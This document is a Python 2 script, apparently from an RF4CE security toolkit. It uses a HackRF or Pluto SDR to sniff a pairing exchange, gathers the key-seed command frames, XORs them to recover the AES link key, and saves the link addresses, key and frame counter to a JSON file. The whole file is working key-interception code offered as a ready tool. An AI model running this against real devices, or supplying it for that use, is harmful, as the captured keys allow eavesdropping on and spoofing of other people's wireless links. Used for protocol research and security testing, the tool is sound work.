#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
Sniffs link information, including key, during pairing.
"""

from __future__ import (absolute_import,
                        print_function, unicode_literals)
from builtins import *

import argparse
from datetime import datetime
import binascii
import functools

from rf4ce import Dot15d4FCS, Dot15d4Data, Raw, makeFCS
from rf4ce import LinkConfig, Rf4ceNode, Rf4ceFrame, Rf4ceException, Rf4ceConstants
from rf4ce.radio import RxFlow
from rf4ce.packetprocessor import PacketProcessor
import struct
import huepy as hue


class KeyProcessor(PacketProcessor):

	"""Key sniffer processor

	Sniffs a pairing procedure to get all link
	information, including the AES key
	"""

	def __init__(self):
		PacketProcessor.__init__(self)
		self.wait_pair_cmd = True
		self.key_index = 0
		self.key_words = [None] * 0x25
		self.link_config = LinkConfig()
		self.success = False

	def process(self, data):
		print(hue.info("Processing packet ..."))

		# Check if the 802.15.4 packet is valid
		if makeFCS(data[:-2]) != data[-2:]:
			print(hue.bad("Invalid packet"))
			return

		# Parse 802.15.4 packet and extract RF4CE payload
		packet = Dot15d4FCS(data)

		if packet.fcf_frametype == 2: # ACK
			return

		# Read source, dest, do not use key
		if packet.fcf_srcaddrmode == 3:
			source = Rf4ceNode(packet.src_addr, None)
			destination = Rf4ceNode(packet.dest_addr, None)
		else:
			source = Rf4ceNode(None, packet.src_addr)
			destination = Rf4ceNode(None, packet.dest_addr)
		key = None
		
		rf4ce_payload = bytes(packet[3].fields["load"])
		frame = Rf4ceFrame()
		
		try:
			frame.parse_from_string(rf4ce_payload, source, destination, key)
		except Rf4ceException, e:
			print(hue.bad("Cannot parse RF4CE frame: {}".format(e)))
			return

		# Start of a key transmission can be detected with 
		# the pairing response command (0x04)
		# Short addresses for source and destination are also
		# provided by this command
		if self.wait_pair_cmd:
			if frame.frame_type == Rf4ceConstants.FRAME_TYPE_COMMAND:
				if frame.command == 0x04:
					print(hue.good("Key transmission started !"))
					short_src, short_dest = self.parse_pairing_response(frame.payload)
					self.link_config.dest_panid = packet.src_panid
					self.link_config.source = Rf4ceNode(packet.dest_addr, short_src)
					self.link_config.destination = Rf4ceNode(packet.src_addr, short_dest)
					self.wait_pair_cmd = False
		# Here, we are now expecting key seed command frames (0x06)
		else:
			if frame.frame_type != Rf4ceConstants.FRAME_TYPE_COMMAND:
				print(hue.bad("Received unexpected frame type: {}".format(frame)))
				return
			
			if frame.command != 0x06:
				print(hue.bad("Received unexpected command: {}".format(frame)))
				return
			
			if frame.payload[0] == self.key_index - 1:
				self.key_index -= 1
				print(hue.info("Key word {} has been sent again".format(self.key_index)))
			
			if frame.payload[0] != self.key_index:
				print(hue.bad("Missed key word {} ! Aborting.".format(self.key_index)))
				self.stop()
				return

			print(hue.good("Received key word {}".format(self.key_index)))

			self.key_words[self.key_index] = frame.payload[1:]
			
			if self.key_index == 0x24:
				print(hue.good("All key words have been received"))
				self.link_config.key = binascii.hexlify(self.compute_key(self.key_words))
				self.link_config.frame_counter = frame.frame_counter
				self.success = True
				self.stop()
			else:
				self.key_index += 1

	def parse_pairing_response(self, data):
		"""Extracts allocated network address and network address
		fields from a pair response command frame payload"""
		short_src, short_dest = struct.unpack("<HH", data[1:5])
		return short_src, short_dest

	def xor(self, word1, word2):
		"""Simple XOR operation between two key words"""
		return [a ^ b for a, b in zip(word1, word2)]

	def compute_key(self, words):
		"""Computes the key from all the key words"""
		seed = functools.reduce(self.xor, words)
		r = [seed[i*16:(i+1)*16] for i in range(5)]
		result = functools.reduce(self.xor, r)
		return bytes(result)


if __name__ == '__main__':

	parser = argparse.ArgumentParser()
	parser.add_argument("output_file", help="output JSON file storing link information")
	parser.add_argument("-c", "--channel", help="RF4CE channel (default: 15)", type=int,
		choices=[15, 20, 25], default=15)
	parser.add_argument("-s", "--sdr", help="SDR Device to use (default: pluto-sdr)", 
		choices=["hackrf", "pluto-sdr"], default="pluto-sdr")
	args = parser.parse_args()

	print(hue.info("Sniffing on channel {}".format(args.channel)))

	key_processor = KeyProcessor()
	tb = RxFlow(args.channel, key_processor, args.sdr)

	key_processor.start()
	tb.start()

	try:
		while True:
			print(hue.info("Sniffing..."))
			key_processor.join(1.0)
			if not key_processor.isAlive():
				break
	except KeyboardInterrupt:
		pass

	if key_processor.success:
		print(key_processor.link_config)
		print(hue.info("Saving link configuration into {}".format(args.output_file)))
		key_processor.link_config.save(args.output_file)

	print(hue.info("Exiting..."))

	tb.stop()
	tb.wait()
	key_processor.stop()
